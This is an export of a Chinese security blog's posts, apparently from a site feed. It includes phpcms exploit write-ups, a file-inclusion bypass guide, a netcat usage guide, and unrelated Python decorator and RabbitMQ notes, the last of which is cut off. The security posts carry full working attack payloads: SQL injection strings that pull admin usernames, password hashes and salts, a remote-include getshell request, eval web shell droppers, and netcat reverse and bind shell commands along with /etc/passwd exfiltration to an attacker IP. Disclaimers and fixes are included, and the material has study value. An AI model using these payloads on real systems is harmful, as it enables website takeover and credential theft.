在post包的payload中，filelist是资源名称，格式filelist=[“/name.mp4”]，path为保存到那个目录下，格式path=/pathnamecookie必须填上，就是之前我们获取到的cookie值。 最终返回内容1&#123;"errno":0,"task_id":0,"info":[&#123;"path":"\/\u5a31\u4e50\u6e38\u620f\/\u4e09\u56fd\u5168\u6218\u6218\u68cb1.4\u516d\u53f7\u7248\u672c.rar","errno":0&#125;],"extra":&#123;"list":[&#123;"from":"\/\u5a31\u4e50\u6e38\u620f\/\u4e09\u56fd\u5168\u6218\u6218\u68cb1.4\u516d\u53f7\u7248\u672c.rar","to":"\/\u4e09\u56fd\u5168\u6218\u6218\u68cb1.4\u516d\u53f7\u7248\u672c.rar"&#125;]&#125;&#125; 最终如果看到以上内容，说明资源已经成功添加到网盘，如果errno为其他值，则说明出现了错误，12代表资源已经存在。 战绩花费了近1个小时之后，我写完了代码，其中大部分时间主要花费在调试与研究数据包上，期间遇到了很多坑，但最终还是解决了。欣赏下程序运行时的快感吧：百度网盘的战果： 搞完这些，写下这篇文章差不多快半夜12点了，视频资源我只跑了一小部分，其余的明天继续。（为了看点视频容易吗我？！） 明天我会放出源代码，今天先共享下我的网盘吧：https://pan.baidu.com/s/1nvz74Vn 项目GitHub地址：https://github.com/tengzhangchao/BaiDuPan]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>百度网盘</tag>
        <tag>python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpcms漏洞]]></title>
    <url>../../../../../../../../2017/04/12/1/</url>
    <content type="text"><![CDATA[风华是一指流砂，苍老是一段年华 最近某位大牛说，将放出3个phpcms的0day漏洞，目前我所了解到的已经有2个phpcms漏洞被流传开来，并放出了poc。phpcms应用范围还是比较广的，在此记录分享一下几个最新的phpcms漏洞。免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负 phpcms 任意文件读取漏洞更新于2017年5月4日漏洞具体细节参考：http://bobao.360.cn/learning/detail/3805.html 漏洞利用方案一：登录普通用户，访问链接：1http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70C 获取分配的att_json,然后将这段json值带入到down类的init函数中去：1http://localhost/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=013ceMuDOmbKROPvvdV0SvY95fzhHTfURBCK4CSbrnbVp0HQOGXTxiHdRp2jM-onG9vE0g5SKVcO_ASqdLoOSsBvN7nFFopz3oZSTo2P7b6N_UB037kehz2lj12lFGtTsPETp-a0mAHXgyjn-tN7cw4nZdk10Mr2g5NM_x215AeqpOF6_mIF7NsXvWiZl35EmQ 方案二：在未登录的情况下访问：1http://localhost/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1 获取当前的siteid,然后再访问:12http://localhost/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&amp;f=p%3%25252%2*70CPOST_DATA:userid_flash=14e0uml6m504Lbwsd0mKpCe0EocnqxTnbfm4PPLW 修复方案升级至官方最新版本 phpcms sql漏洞Poc存在sql注入漏洞的页面：http://192.168.1.139:8080/phpcms/index.php?m=member&amp;c=index&amp;a=login获取当前数据库，post：1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bdatabase())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取当前用户，post：123forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95获取表名：forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2btable_name%2bfrom%2binformation_schema.tables%2bwhere%2btable_schema='phpcmsv9'%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 若要获取其他表名，修改limit即可。获取用户名:1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2busername%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取密码：1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 获取到的密码为30位的md5，一般的MD5是32位，所以我们需要再获取后2位：1orward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(substring((select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c-2%252c2))%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 phpcms是加盐（salt）的，获取salt:1forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&amp;username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bencrypt%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&amp;code=验证码&amp;dosubmit=%E7%99%BB%E5%BD%95 以上Poc来自：https://www.unhonker.com/bug/1834.html exp漏洞利用脚本exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/exp脚本可以参考：https://www.waitalone.cn/phpcmsv9-authkey-exp.html漏洞细节请参考：http://mp.weixin.qq.com/s/cI-wbQyX-3WLhxJ5kqez4A 漏洞修复方案 去掉modules\content\down.php文件 phpcms注册页面getshell漏洞 存在的漏洞：php远程文件包含、任意文件上传 漏洞利用点：phpcms注册页面 利用类型：http post请求导致任意文件上传+getshell Post Poc1siteid=1&amp;modelid=11&amp;username=newbie&amp;password=newbie&amp;email=newbie@qq.com&amp;info[content]=&lt;img src=http://shhdmqz.com/newbie.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol= 注意：http://shhdmqz.com/newbie.txt为远程服务器上的shell文件，这个漏洞利用了远程文件包含与文件上传漏洞。 漏洞利用细节 访问注册页面发送post包，重构info字段内容，写入远程包含的文件地址《img src=http://shhdmqz.com/newbie.txt?.php#.jpg》，newbie.txt为文件名，?.php#.jpg为构造的文件名，为了绕过后缀名限制。回包将会有报错信息，但文件可以上传成功，且报错信息中含有上传的文件路径，可用菜刀链接。 exp漏洞利用脚本exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/ 漏洞修复方案暂时性修复： 关闭注册页面 关闭远程文件包含，即关闭allow_url_fopen 彻底性修复：修改phpcms/libs/classes/attachement.class.php文件中的download函数在foreach($remotefileurls as $k=&gt;$file)循环中，大约是167行左右的位置，将1if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file); 修改成1$filename = fileext($k); 关于文件包含漏洞，可参考：文件包含漏洞 任意文件读取漏洞1index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=..\/..\/caches/error_log.php phpcms敏感信息 默认账号密码：phpcms/phpcms 默认后台： http://www.xx.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash= 会员中心地址：index.php?m=member&amp;c=index&amp;a=login 本篇将持续跟踪phpcms最新漏洞状况，并附上检测方法以及修复方案，协助管理员早日修复漏洞，谢谢！]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>phpcms漏洞</tag>
        <tag>文件包含漏洞</tag>
        <tag>cms漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞(绕过姿势)]]></title>
    <url>../../../../../../../../2017/04/10/2/</url>
    <content type="text"><![CDATA[谁将烟焚散，散了纵横的牵绊 文件包含漏洞是渗透测试过程中用得比较多的一个漏洞，主要用来绕过waf上传木马文件。今日在逛Tools论坛时，发现了一种新型的文件包含姿势，在此记录分享，并附上一些文件包含漏洞的基础利用姿势。 特殊姿势 利用phar://协议特性可以在渗透过程中帮我们绕过一些waf检测，phar:// 数据流包装器自 PHP 5.3.0 起开始有效，貌似可以绕过安全狗。 利用过程新建shell.php代码内容：123&lt;?phpinclude 'phar://test.rar/test.txt';?&gt; 新建test.txt里的内容：123&lt;?phpphpinfo();?&gt; 压缩test.txt文件，可以重命名压缩文件为zip,phar,rar等格式，之后访问shell.php文件后，会出现phpinfo内容。 亲测有效在实验环境下，在test目录下新建shell.php，test.txt，并将test.txt打包成test.zip。shell.php内容如下：test.txt内容如下：访问shell.php: 参考：http://bbs.pediy.com/thread-216191.htm php文件包含漏洞PHP中的文件包含分为本地包含与远程包含，导致文件包含的函数如下： include() include_once() require() require_once() fopen() readfile()…… 本地包含漏洞（LFI）新建一个phpinfo.txt，然后新建一个shell.php，写入：123&lt;?php Include("phpinfo.txt");?&gt; 访问shell.php会输出phpinfo页面内容，无论将扩展名改为什么，都将以php代码执行。如果文件不是符合php规则的（即没有写&lt;?php ?&gt;等），则通过include可以直接输出源码。 远程包含漏洞前提：需要开启allow_url_fopen，默认关闭。新建php.txt:123&lt;?php echo "hello world";?&gt; 新建index.php:123&lt;?php Include($_GET['page']);?&gt; 访问http://www.xxxx.com/page=http://www.xxxx.com/php.txt执行结果将输出hello world。 文件包含利用读取敏感信息如：http://www.xxx.com/index.php?page=/etc/passwdWindows:12345c:\boot.inic:\windows\systems32\inetsrv\MetaBase.xmlc:\windows\repair\samc:\windows\php.ini php配置文件c:\windows\my.ini mysql配置文件 LINUX:12345/etc/passwd/usr/local/app/apache2/conf/http.conf/usr/local/app/php5/lib/php.ini PHP相关设置/etc/httpd/conf/http.conf apache配置文件/etc/my.cnf mysql配置文件 远程包含shelltest.txt文件，可以保存在远程服务器上，内容如下：1&lt;?fputs(fopen("shell.php","w"),"&lt;?php eval($_POST[nmask]);?&gt;")?&gt; 如果目标网站存在远程包含漏洞，则可以通过访问：http://www.xxx1.com/index.php?page=http://www.xx2.com/test.txt则会在服务器根目录下生产一个shell.php内容为:1&lt;?php eval($_POST[nmask]);?&gt; 本地包含配合文件上传如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传上传一个图片木马a.jpg，内容为：1&lt;?fputs(fopen("shell.php","w"),"&lt;?php eval($_POST[tzc]);?&gt;")?&gt; 访问URL：http://www.xxx.com/index.php?page=./a.jpg在本地生成shell.php。 本地包含配合apache日志拿shell apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，便会将这个页面写入access.log中。如访问URL:http://www.xxx.com/&lt;?php eval([$_POST]);?&gt;则会将一句话写入到access.log中，但是一般来说，写入到access.log文件中的一句话是被编码的，所以需要抓包绕过，而且利用此漏洞需要知道access.log的地址，不然便没有。 利用/proc/self/environ进行包含如：http://www.test.com/view.php?page=../../../../proc/self/environ这是web进程运行时的环境变量，其中有些参数是可以被用户控制的，最常见做法就是在User-Agent中插入一句话。 利用php协议进行包含 data: php5.2以后版本 php://input 需要开启allow_url_include poc:1http://www.test.com/index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;%00 截断包含有些开发者为了防止本地包含漏洞，会编写一下代码:123&lt;?php Include $_GET['page'].".php"?&gt; （一）00截断包含新建1.jpg:1&lt;?fputs(fopen("shell.php","w"),"&lt;?php eval($_POST[tzc]);?&gt;")?&gt; 这样的话比如上传一个1.jpg图片码，则访问http://www.xxx.com/1.jpg时，访问的是1.jgp.php，以为没有这个文件所以报错。这是，可以尝试访问http://www.xxx.com/1.jpg%00 （二）使用长目录截断12345././././././././././././././etc/passwd或者////////////////////////////etc/passwd或者../a/etc/passwd/../a/etc/passwd/../a/etc/passwd 在windows下目录最大长度为256字节，linux下为4096字节，其后面超出部分被丢弃。 文件包含漏洞修复开启open_basedir函数，将其设置为指定目录，则只有该目录的文件允许被访问。关闭allow_url_include函数，防止远程文件包含。 jsp文件包含漏洞include123&lt;%@ include file="head.jsp"%&gt;&lt;%@ include file="body.jsp"%&gt;&lt;%@ include file="tail.jsp"%&gt; jsp:include123&lt;jsp:include page="head.jsp"/&gt;&lt;jsp:include page="body.jsp"/&gt; &lt;jsp:include page="tail.jsp”/&gt; 采用JSTL1&lt;c:import url="http://thief.one/1.jsp"&gt; 说明(1)include指令在转换时插入“Header.jsp”的源代码，而标准动作在运行时插入“Header.jsp”的响应。元素允许你包含动态文件和静态，而include说明标签仅仅是把一个文件内容当成静态追加到主文件中去。(2)采用前两种方式，只能包含当前web应用的界面，不过c:import可以包含容器之外的内容。 asp文件包含漏洞asp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下：1&lt;!--#include file="1.asp" --&gt; aspx文件包含漏洞aspx文件包含与asp一样，语法如下：1&lt;!--#include file="top.aspx" --&gt; 传送门文件上传漏洞(绕过姿势)]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透神器系列】nc]]></title>
    <url>../../../../../../../../2017/04/10/1/</url>
    <content type="text"><![CDATA[工欲善其事，必先利其器 从事渗透测试工作几年了，在做项目过程中发现良好的渗透技术固然重要，但欲测试出更多的结果，离不开强大的工具。即使是能力超强的大牛，我想也不可能完全手工做渗透，毕竟渗透测试还是个体力活。 现在有些人认为渗透测试越来越简单了，因为开源的自动化工具一大推，轮子也是更新换代。即使对安全一窍不通，只要上工具一跑也能获得很多漏洞，甚至自动化获取权限。我必须得承认目前层出不穷的自动化渗透工具已降低了这个行业的入门门槛，但这不意味着渗透测试工作日趋简单。 首先我的理由是安全攻防永远是此消彼长，技术从未停滞过，安全技术永远领先于安全工具，因此只会使用工具，有时会使渗透测试工作很难开展下去，因为防护手段日益更新，而攻击技术却只能依赖滞后的工具，这样的测试效果可见一斑。其次是目前市面上强大的渗透工具，都需要一定的使用基础，绝非傻瓜式的操作，想要用好一款神器，也并非易事。综上所述，我个人认为目前渗透测试工作的难度反而会更大，并且随着国家企业对安全的重视，渗透测试从业者肩上的担子也只会更重。 开篇扯了半天蛋无非是想引出本系列的主题——渗透神器，之所以想要介绍记录渗透测试中使用的神器，是因为工欲善其事，必先利其器，仅此而已！ 本篇作为此系列第一篇，将介绍一款渗透界经久不衰的神器，有瑞士军刀美誉的NC。本篇所记内容大部分来自互联网，如觉内容老套可自行绕道，本人尽量全方面记录NC的使用方法，全当个人查询之用，轻喷即可。 nc Introducenc全称netcat,是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据，功能强大。 nc Installlinux/mac上默认安装nc，可在命令行下输入nc -h查看。windows下可下载nc.exe工具使用。 nc Usage基本用法可以输入nc -h查看帮助： -h 查看帮助信息-d 后台模式-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, …-e prog程序重定向，一但连接就执行［危险］-i secs延时的间隔-l 监听模式，用于入站连接-L 监听模式，连接天闭后仍然继续监听，直到CTR+C-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)-o film记录16进制的传输-p[空格]端口 本地端口号-s addr 本地源地址-r 随机本地及远程端口-t 使用Telnet交互方式-u UDP模式-v 详细输出，用-vv将更详细-w 数字 timeout延时间隔-z 将输入，输出关掉（用于扫锚时） PortScan(端口扫描)基本tcp扫描：12nc -vv ip port例：nc -vv 192.168.1.1 5000 扫描192.168.1.1的tcp 5000端口 设置延时，指定端口扫描：12nc -vv -w secs ip port-port例：nc -vv -w 5 192.168.1.1 5000-5002 扫描192.168.1.1的5000-5002端口，网络超时的时间设为5秒。 建立连接正向连接目标监听一个端口：12nc -l -p port -e cmd.exe //windowsnc -l -p port -e /bin/sh //linux 本机去连接此端口：1nc ip port 反向链接本机监听一个端口：1nc -vv -l -p port 目标连接此端口：12nc -e cmd.exe ip port //windowsnc -e /bin/sh ip port //linux 传送文件目标机上下载文件1234victim machine:nc attack_ip port &lt; /etc/passwdattacker machine:nc -d -l -p port &gt; tmp 实例：本机作为目标机，因为是内网ip，模拟现实情况，113.214.238.185为攻击机，现在就是要从目标机上下载文件到攻击机上。目标机：nc.exe 113.214.238.185 9999 &lt; H:\test.txt 将目标机H盘下test.txt文件传输到攻击机9999端口上攻击机：nc.exe -d -l -p 9999 &gt; test.txt 将本机9999端口传输过来的文件重命名为test.txt 上传文件至目标机1234attacker machine:nc -d -l -p port &lt; tmpvictim machine:nc attack_ip port &gt; tmp 实例：攻击机：nc -d -l -p 9990 &lt; test2.txt目标机：nc 113.214.238.185 9990 &gt; test2.txt 端口数据抓包1nc -vv -w 2 -o test.txt thief.one 80 21-15 自定义配合|&lt;等命令，可无限放大NC的功能。 加密传输的数据服务端：$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt客户端：$mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1567 目录传输目标机：$tar -cvf – dir_name | nc -l 1567攻击机：$nc -n 10.0.0.2 1567 | tar -xvf - 命令记录1nc -vv victim_ip port &lt; path\file.cmd 搭建蜜罐 nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 nc -L -p 80 &gt; c:\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt nc -L -p 80 &lt; c:\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用 type.exe c:\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用 类nc工具 ncat 安装nmap后默认安装ncat，用法于nc类似。 Pyshell 致敬nc的一款后门shell工具。 传送门【渗透神器系列】Metasploit【渗透神器系列】DNS信息查询【渗透神器系列】Fiddler【渗透神器系列】nmap【渗透神器系列】搜索引擎【渗透神器系列】WireShark 参考文章：https://www.oschina.net/translate/linux-netcat-commandhttp://www.w3cschool.cn/dosmlxxsc1/jiszug.html]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>渗透神器</tag>
        <tag>nc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python装饰器]]></title>
    <url>../../../../../../../../2017/04/07/Python装饰器/</url>
    <content type="text"><![CDATA[种一棵树最好的时间是十年前，其次是现在! 作为一个脚本小子，平日里写惯了脚本，不太习惯编写项目型的代码。然而报着提升代码质量、提高编码能力的态度，最近开始尝试学习一些编程高级用法，本章用于记录关于python装饰器的一些基础用法，欢迎纠错。 装饰模式有很多经典的使用场景，例如插入日志、性能测试、事务处理等等，有了装饰器，就可以提取大量函数中与本身功能无关的类似代码，从而达到代码重用的目的。简单来说，装饰器的特点就是接收函数作为参数，然后返回函数。 入门12345678def log(func): def wrapper(*args, **kw): print 'call %s():' % func.__name__ return func(*args, **kw) return wrapper@log #now = log(now)def now(): print '2013-12-25' 运行：123&gt;&gt;&gt; now()call now():2013-12-25 执行流程说明： @log相当于now=log(now)，原来的now函数还在，只是现在now变量指向了新函数。因此当我们运行now()时，并不是运行now函数，而是运行log(now)返回的函数，即warpper函数。运行warpper函数后，会输出call….，然后执行func(args,**kwargs)，而func就是传入的函数now，因此就是执行now函数，即now(args,*kwargs),输入2013-12-25，从而达到了不必修改now函数，在执行now函数前输出内容。 进阶12345678910111213141516171819202122232425#! -*- coding:utf-8 -*-import functoolsdef log(*args): if len(args)&gt;0: text=args[0] else: text="" def a(func): @functools.wraps(func) #run函数属性赋值给b函数，如果不写，则最后run.__name__输出的应该是b，而不是run def b(*args,**kwargs): print "begin start",text #执行run函数前的输出 func(*args,**kwargs) print "end" #执行run函数后的输出 return b return a@log('nmask') #or @log() 支持不定参数def run(*args,**kwargs): ##支持不定参数 for i in args: print irun(1,2,3)print run.__name__ #run变量背后的函数名称 运行：123456begin start nmask123endrun log函数为装饰器函数，run函数为普通函数。 @log相当于 run=log(run) @log()相当于 run=log()(run) @log(“test”)相当于run=log(“test”)(run) 执行流程说明： 当执行run(1,2,3)函数时，实际先执行了log(’test’)函数，返回了a， 然后继续执行a(run)，返回b函数，最后将b复制给run，执行run(1,2,3)，实际是执行b(1,2,3)，先输出begin start，然后执行run(1,2,3)（真正的run函数），输出 1,2,3，最后输出end。 实例演示输入当前时间：12345678910111213def current_time(func): ''' 输出当前时间装饰器 ''' def wrapper(*args,**kw): print_time=time.strftime(ISOTIMEFORMAT,time.localtime()) print "%s[Log_Info]Nowtime is:%s%s" % (BLUE,print_time,END) func(*args,**kw) print_time=time.strftime(ISOTIMEFORMAT,time.localtime()) print "%s[Log_Info]Nowtime is:%s%s" % (BLUE,print_time,END) print "---------------------------------" return wrapper 给函数添加协程：12345678910111213141516171819def gevent_wrapper(*args): ''' 将单线程的程序变成协程并发的装饰器 ''' import gevent from gevent import monkey,pool;monkey.patch_all() import functools target_list=args[0] #待检测目标列表 def run(func): @functools.wraps(func) def wrapper(*args,**kw): p = pool.Pool(5) #协程池大小 tasks = [p.spawn(func,*args,**kw) for i in target_list] gevent.joinall(tasks) return wrapper return run 参考：装饰器|廖雪峰 推荐新手学习！]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>装饰器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RabbitMQ+Pika]]></title>
    <url>../../../../../../../../2017/04/06/RabbitMQ/</url>
    <content type="text"><![CDATA[如何看待“年轻时就释怀与淡泊，是没有希望的”这句话？试图用一句话就来总结复杂的人生，是没有希望的MQ全称为Message Queue,消息队列（MQ）是一种应用程序对应用程序的通信方法，是消费-生产者模型的一个典型的代表。在python中，线程间通信可以使用Queue，进程间通信可以使用multiprocessing.Queue，然而不同服务器之间通信便可以使用MQ，本文用于记录MQ的安装使用过程。 Rabbitmq安装首先需要按照rabbitmq服务，可以在本地装，也可以在远程服务器上安装。 ubuntu下安装1sudo apt-get install rabbitmq-server 安装后，rabbitmq服务就已经启动了。详细参考：http://www.rabbitmq.com/download.html（官网） centos下安装安装Erlang语言：1yum install erlang 安装Rabbitmq：12wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.3.5/rabbitmq-server-3.3.5-1.noarch.rpmyum install rabbitmq-server-3.3.5-1.noarch.rpm 加入开机启动服务1chkconfig rabbitmq-server on 然后启动1234service rabbitmq-server startservice rabbitmq-server statusservice rabbitmq-server stopservice rabbitmq-server restart 开启web插件：1rabbitmq-plugins enable rabbitmq_management 访问http://localhost:15672 但是此时，guest用户登录不了，因为默认是不允许guest用户登录的，解决方案可以是创建一个新的用户：123rabbitmqctl delete_user guestrabbitmqctl add_user admin 123456rabbitmqctl set_user_tags admin administrator 当然也可以为guest添加权限，使其可以登陆：1[&#123;rabbit, [&#123;loopback_users, []&#125;]&#125;] #编辑rabbitmq配置文件，删除这一行中的guest centos安装rabbitmq参考：http://www.qaulau.com/linux-centos-install-rabbitmq/ Rabbitmq配置rabbitmq命令1234567rabbitmqctl status 查看运行状态rabbitmqctl list_queues 查看队列情况rabbitmq-plugins enable rabbitmq_management 开启插件（不然网页管理界面打不开）sudo rabbitmq-server 运行以后访问http://127.0.0.1:15672sudo rabbitmq-server -detached 运行sudo rabbitmqctl stop 结束rabbitmqctl reset 清除所有队列 (要先关闭) 配置rabbitmq1234$ sudo rabbitmqctl add_user myuser mypassword$ sudo rabbitmqctl add_vhost myvhost$ sudo rabbitmqctl set_user_tags myuser mytag$ sudo rabbitmqctl set_permissions -p myvhost myuser ".*" ".*" ".*" rabbitmq更改WEB插件端口安装完rabbitmq后，/usr/share/doc/rabbitmq-server-3.5.6目录下默认会有一个配置文件模版rabbitmq.config.example。 复制配置文件到/etc/rabbitmq目录下1cp /usr/share/doc/rabbitmq-server-3.5.6/rabbitmq.config.example /etc/rabbitmq/ 更改配置文件名字12cd /etc/rabbitmq/mv rabbitmq.config.example rabbitmq.config 编辑配置文件vim rabbitmq.config123456&#123;rabbitmq_management, [&#123;listener, [&#123;port, 8080&#125;, &#123;ip, "0.0.0.0"&#125;, &#123;ssl, false&#125;]&#125;, 说明：可以用”?rabbitmq_management”定位到这一行，然后%%是注释的意思，将%%删除，整个rabbitmq_management字典写成上面的内容。rabbitmq配置文件可以设置很多东西，默认是没有的，建议创建起来。 重启rabbitmq1Service rabbitmq-server restart 重启服务，如果报错，则查看日志文件：cat /var/log/rabbitmq/startup_err。 Rabbitmq报错处理[Errno 104] Connection reset by peer在连接rabbitmq时报此错误，说明该用户与虚拟目录的权限不够，解决方案：（1）查看已经存在的虚拟目录：1rabbitmqctl list_vhosts （2）将用户与虚拟目录绑定且设定权限，如：1rabbitmqctl set_permissions -p / guest ".*" ".*" ".*" 默认情况下就一个vhost，即／，当然也可以自己添加，然后跟用户绑定：12sudo rabbitmqctl add_vhost myvhostsudo rabbitmqctl set_permissions -p myvhost myuser ".*" ".*" ".*" ERROR: epmd error for host nmask: timeout (timed 